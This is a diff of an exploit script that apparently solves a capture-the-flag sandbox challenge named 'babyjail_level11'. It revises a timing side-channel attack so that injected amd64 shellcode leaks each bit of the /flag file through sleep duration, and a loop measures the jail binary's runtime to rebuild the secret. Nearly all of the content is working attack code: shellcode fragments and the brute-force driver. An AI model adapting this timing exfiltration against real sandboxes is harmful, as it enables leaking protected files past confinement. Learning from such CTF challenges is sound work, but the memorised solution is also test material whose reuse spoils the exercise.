@@ -9,7 +9,9 @@ syscall ;\
 
 xor rbx,rbx ;\
 mov bl,[rsi+{}] ;\
-sub bl,0x40 ;\
+shr bl,{} ;\
+and bl,1 ;\
+shl bl,2 ;\
 push 0 ;\
 push rbx ;\
 
@@ -23,18 +25,25 @@ b *main+830
 """
 flag = ''
 for i in range(100):
-    
-    t=system("""
-    asm -c "amd64" "{}" -f raw > /tmp/shellcode.bin
-    start=$(date +%s)
-    ./babyjail_level11 /flag < /tmp/shellcode.bin 1>/dev/null 2>/dev/null
-    end=$(date +%s)
-    #echo "Elapsed time: $(($end-$start)) s"
-    exit  $(($end-$start))
-    """.format(shellcode.format(i))) // 0x100
-    log.info(chr(t+0x40))
-    if t:
-        flag += chr(t+0x40)
-    else:
+    c=''
+    for j in range(8):
+        t=system("""
+        asm -c "amd64" "{}" -f raw > /tmp/shellcode.bin
+        start=$(date +%s)
+        ./babyjail_level11 /flag < /tmp/shellcode.bin 1>/dev/null 2>/dev/null
+        end=$(date +%s)
+        echo "Elapsed time: $(($end-$start)) s"
+        exit  $(($end-$start))
+        """.format(shellcode.format(i,j))) // 0x100
+        if t>=4:
+            t=1
+        elif t<4:
+            t=0
+        #print(t,end='')
+        c+=str(t)
+    c=int(c[::-1],2)
+    if not c:
         break
+    log.info(chr(c))
+    flag+=chr(c)
 print(flag)
